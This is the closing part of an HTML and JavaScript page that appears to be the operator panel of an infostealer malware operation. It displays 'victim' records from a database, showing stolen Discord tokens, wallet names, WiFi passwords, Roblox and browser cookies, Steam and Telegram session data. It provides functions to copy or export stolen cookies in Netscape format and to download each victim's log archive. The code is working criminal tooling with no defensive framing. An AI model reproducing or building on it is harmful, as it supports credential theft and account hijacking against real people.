                    </div>
                    ${additionalFiles.length > 0 ? `<div class="files-container"><div class="file-categories">${Object.entries(groupFiles(additionalFiles)).map(([type, files]) => `<div class="file-category"><div class="file-category-header"><span class="file-category-name">${type}</span><span class="file-category-count">${files.length} files</span></div><div class="file-list">${files.map(f => `<div class="file-item"><div class="file-info"><i class="fas fa-file-alt"></i><span class="file-name">${f.fileName || 'Unknown'}</span><span class="file-size">${formatSize(f.fileSize || 0)}</span></div><button class="btn btn-sm btn-secondary" onclick="window.downloadFile('${f.fileId || ''}', '${f.fileName || ''}')"><i class="fas fa-download"></i></button></div>`).join('')}</div></div>`).join('')}</div></div>` : `<div class="empty">No additional files.</div>`}
                </div>`;

                // ----- Discord Tokens (collapsible, only if non-empty) -----
                if (discordAccounts.length > 0) {
                    html += `<div class="hit-section">
                        <div class="section-header">
                            <i class="fab fa-discord"></i><span>Discord Tokens</span>
                            <span class="section-count">${discordAccounts.length}</span>
                            <i class="fas fa-chevron-down chevron"></i>
                        </div>
                        <div class="section-content">
                            <div class="table-scrollable"><table class="data-table"><thead><tr><th>Username</th><th>Email</th><th>Token</th><th>Nitro</th><th>Billing</th></tr></thead><tbody>${discordAccounts.map(a => `<tr><td>${a.username || 'N/A'}</td><td>${a.email || 'N/A'}</td><td class="copyable" data-copy="${a.token}"><span class="truncate token-cell">${a.token}</span></td><td>${a.premium > 0 ? (a.premium === 2 ? 'Boost' : 'Classic') : 'None'}</td><td>${a.billing || 'None'}</td></tr>`).join('')}</tbody></table></div>
                        </div>
                    </div>`;
                }

                // ----- Wallets (collapsible, only if non-empty) -----
                if (walletNames.length > 0) {
                    html += `<div class="hit-section">
                        <div class="section-header">
                            <i class="fas fa-wallet"></i><span>Wallets</span>
                            <span class="section-count">${walletNames.length}</span>
                            <i class="fas fa-chevron-down chevron"></i>
                        </div>
                        <div class="section-content">
                            <div class="cookies-container"><ul style="list-style:none;display:flex;flex-wrap:wrap;gap:0.5rem;padding:0.5rem 0;">${walletNames.map(w => `<li style="background:var(--bg-tertiary);padding:0.3rem 0.8rem;border-radius:20px;border:1px solid var(--border-color);font-size:0.8rem;">${w}</li>`).join('')}</ul></div>
                        </div>
                    </div>`;
                }

                // ----- WiFi Networks (collapsible, only if non-empty) -----
                if (wifiNetworks.length > 0) {
                    html += `<div class="hit-section">
                        <div class="section-header">
                            <i class="fas fa-wifi"></i><span>WiFi Networks</span>
                            <span class="section-count">${wifiNetworks.length}</span>
                            <i class="fas fa-chevron-down chevron"></i>
                        </div>
                        <div class="section-content">
                            <div class="table-scrollable"><table class="data-table"><thead><tr><th>SSID</th><th>Password</th></tr></thead><tbody>${wifiNetworks.map(w => `<tr><td><span class="truncate">${w.ssid}</span></td><td class="password-cell"><span class="password-masked">********</span><span class="password-revealed">${w.password || ''}</span><button class="reveal-btn" onclick="window.togglePassword(this)"><i class="fas fa-eye eye-icon"></i><i class="fas fa-eye-slash eye-off-icon"></i></button></td></tr>`).join('')}</tbody></table></div>
                        </div>
                    </div>`;
                }

                // ----- Roblox (collapsible, only if exists) -----
                if (roblox) {
                    html += `<div class="hit-section">
                        <div class="section-header">
                            <i class="fas fa-robot"></i><span>Roblox</span>
                            <i class="fas fa-chevron-down chevron"></i>
                        </div>
                        <div class="section-content">
                            <div class="hit-card-body"><div class="info-grid">
                                <div class="info-item"><span class="info-label">Username</span><span class="info-value">${roblox.name || 'N/A'}</span></div>
                                <div class="info-item"><span class="info-label">Robux</span><span class="info-value">${roblox.robux || 0}</span></div>
                                <div class="info-item"><span class="info-label">Premium</span><span class="info-value">${roblox.premium ? 'Yes' : 'No'}</span></div>
                                <div class="info-item"><span class="info-label">Cookie</span><span class="info-value copyable" data-copy="${roblox.cookie || ''}"><span class="truncate">${roblox.cookie ? '********' : 'N/A'}</span></span></div>
                            </div></div>
                        </div>
                    </div>`;
                }

                // ----- Steam (collapsible, only if account_name exists) -----
                if (steam && steam.account_name) {
                    html += `<div class="hit-section">
                        <div class="section-header">
                            <i class="fab fa-steam"></i><span>Steam</span>
                            <i class="fas fa-chevron-down chevron"></i>
                        </div>
                        <div class="section-content">
                            <div class="hit-card-body"><div class="info-grid">
                                <div class="info-item"><span class="info-label">Account</span><span class="info-value">${steam.account_name || 'N/A'}</span></div>
                                <div class="info-item"><span class="info-label">Steam ID</span><span class="info-value">${steam.steam_id || 'N/A'}</span></div>
                            </div></div>
                        </div>
                    </div>`;
                }

                // ----- Telegram (collapsible, only if true) -----
                if (telegram) {
                    html += `<div class="hit-section">
                        <div class="section-header">
                            <i class="fab fa-telegram"></i><span>Telegram</span>
                            <i class="fas fa-chevron-down chevron"></i>
                        </div>
                        <div class="section-content">
                            <div class="empty">Telegram session data found.</div>
                        </div>
                    </div>`;
                }

                document.getElementById('detailsContent').innerHTML = html;
                window._victimData = victim;

                // Copyable click handlers
                document.querySelectorAll('.copyable[data-copy]').forEach(el => {
                    el.addEventListener('click', function() {
                        const text = this.dataset.copy;
                        if (text && text !== 'N/A' && text !== '') {
                            navigator.clipboard.writeText(text).then(() => showToast('Copied')).catch(() => showToast('Failed', 'error'));
                        }
                    });
                });

                // Collapse/expand on header click (only sections with .chevron)
                document.querySelectorAll('.hit-section .section-header').forEach(header => {
                    header.addEventListener('click', function(e) {
                        if (e.target.closest('.btn') || e.target.closest('.reveal-btn')) return;
                        const section = this.closest('.hit-section');
                        if (section) {
                            section.classList.toggle('collapsed');
                        }
                    });
                });
            }

            // ===== TOGGLE PASSWORD =====
            window.togglePassword = function(btn) {
                const cell = btn.closest('.password-cell');
                if (cell) {
                    cell.classList.toggle('revealed');
                }
            };

            // ===== OTHER GLOBAL FUNCTIONS =====
            window.openScreenshot = function(src) {
                const overlay = document.createElement('div');
                overlay.className = 'screenshot-overlay';
                overlay.innerHTML = `<div class="screenshot-lightbox"><img src="${src}" alt="Screenshot"><button class="lightbox-close" onclick="this.closest('.screenshot-overlay').remove()">&times;</button></div>`;
                overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
                document.body.appendChild(overlay);
            };

            window.copyCookieGroup = function(btn) {
                const profile = btn.closest('.cookie-profile');
                const browser = profile.dataset.browser;
                const profileName = profile.dataset.profile;
                const cookies = window._victimData ? safeParseData(window._victimData.data).cookies || [] : [];
                const groupCookies = cookies.filter(c => c.browser === browser && c.profile === profileName);
                const content = generateNetscapeCookies(groupCookies);
                navigator.clipboard.writeText(content).then(() => showToast('Cookies copied')).catch(() => showToast('Failed', 'error'));
            };

            window.downloadCookieGroup = function(btn) {
                const profile = btn.closest('.cookie-profile');
                const browser = profile.dataset.browser;
                const profileName = profile.dataset.profile;
                const cookies = window._victimData ? safeParseData(window._victimData.data).cookies || [] : [];
                const groupCookies = cookies.filter(c => c.browser === browser && c.profile === profileName);
                const content = generateNetscapeCookies(groupCookies);
                const blob = new Blob([content], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `${browser}_${profileName}_cookies.txt`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                showToast('Cookies downloaded');
            };

            window.downloadFile = function(fileId, fileName) {
                showToast('File download coming soon (fileId: ' + fileId + ')', 'warning');
            };

            window.downloadAll = function() {
                if (!window._victimData) return;
                const data = safeParseData(window._victimData.data);
                const zipUrl = data.logs_zip;
                if (zipUrl) {
                    const a = document.createElement('a');
                    a.href = zipUrl;
                    a.download = 'logs.zip';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    showToast('Downloading logs.zip...');
                } else {
                    showToast('No zip available for this hit.', 'warning');
                }
            };

            function goBack() {
                if (document.referrer && (document.referrer.includes('hits.html') || document.referrer.includes('dashboard.html'))) {
                    window.history.back();
                } else {
                    window.location.href = 'hits.html';
                }
            }
            window.goBack = goBack;

            function showToast(message, type = 'success') {
                const toast = document.createElement('div');
                toast.style.cssText = `position:fixed; bottom:20px; right:20px; padding:12px 24px; border-radius:var(--radius-md); background:var(--bg-secondary); border:1px solid var(--border-color); color:var(--text-primary); box-shadow:0 4px 20px rgba(0,0,0,0.5); z-index:9999; font-size:14px; display:flex; align-items:center; gap:12px; opacity:0; transform:translateY(20px); transition:opacity 0.3s, transform 0.3s; pointer-events:none;`;
                const icons = { success: '<i class="fas fa-check-circle" style="color:var(--success)"></i>', error: '<i class="fas fa-exclamation-circle" style="color:var(--danger)"></i>', warning: '<i class="fas fa-exclamation-triangle" style="color:var(--warning)"></i>' };
                toast.innerHTML = `${icons[type] || icons.success} ${message}`;
                document.body.appendChild(toast);
                requestAnimationFrame(() => { toast.style.opacity = '1'; toast.style.transform = 'translateY(0)'; });
                setTimeout(() => {
                    toast.style.opacity = '0';
                    toast.style.transform = 'translateY(20px)';
                    setTimeout(() => toast.remove(), 300);
                }, 3000);
            }

            // ----- Logout -----
            window.logout = async function() {
                await supabaseClient.auth.signOut();
                window.location.href = 'login.html';
            };

            // ----- Init -----
            const victimId = getVictimId();
            if (!victimId) {
                document.getElementById('detailsContent').innerHTML = '<div class="error">No victim ID provided.</div>';
                document.getElementById('detailsId').textContent = 'Error';
                return;
            }

            document.getElementById('detailsId').textContent = victimId;

            supabaseClient.auth.getSession().then(({ data: { session } }) => {
                if (!session) {
                    window.location.href = 'login.html';
                    return;
                }
                const user = session.user;
                checkVip(user.id);
                const avatarUrl = user.user_metadata?.avatar_url || '';
                const userName = user.user_metadata?.full_name || user.user_metadata?.name || user.email || 'User';
                const email = user.email || '';
                document.getElementById('sidebarUsername').textContent = userName;
                document.getElementById('sidebarEmail').textContent = email;
                const avatarImg = document.getElementById('avatarImg');
                const defaultIcon = document.getElementById('defaultAvatarIcon');
                if (avatarUrl) {
                    avatarImg.src = avatarUrl;
                    avatarImg.style.display = 'block';
                    defaultIcon.style.display = 'none';
                } else {
                    avatarImg.style.display = 'none';
                    defaultIcon.style.display = 'block';
                }

                supabaseClient.from('victims').select('*').eq('id', victimId).single().then(({ data, error }) => {
                    if (error) {
                        document.getElementById('detailsContent').innerHTML = `<div class="error">Error: ${error.message}</div>`;
                        return;
                    }
                    renderDetails(data);
                });
            });
        })();
    </script>
</body>
</html>
